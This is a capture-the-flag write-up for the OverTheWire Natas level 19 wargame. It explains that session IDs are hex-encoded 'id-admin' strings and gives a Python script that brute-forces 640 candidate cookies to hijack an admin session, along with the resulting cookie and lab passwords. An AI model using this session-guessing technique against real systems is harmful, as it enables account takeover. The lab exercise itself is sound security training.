# Natas Level 19 to 20

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 19 -> 20 |
| Status | Complete |

## Objective

Find an admin session when session IDs are encoded rather than plainly sequential.

## Given Access

User: `natas19`

Password:

```text
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

## Method

The source builds session IDs as `bin2hex("$idnum-$user")`. Try the hex encoding of `1-admin` through `640-admin`.

## Commands

```python
import requests

url = "http://natas19.natas.labs.overthewire.org/"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

for sid in range(1, 641):
    cookie = f"{sid}-admin".encode().hex()
    r = requests.get(url, auth=auth, cookies={"PHPSESSID": cookie}, timeout=10)
    if "You are an admin" in r.text:
        print(sid, cookie)
        print(r.text)
        break
```

## Result

Admin session ID:

```text
281-admin
```

Hex cookie:

```text
3238312d61646d696e
```

Password for `natas20`:

```text
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```

## Lesson

Encoding is not randomness. Once the session ID structure is known, the search space is still only 640 candidates.

## References

- https://overthewire.org/wargames/natas/
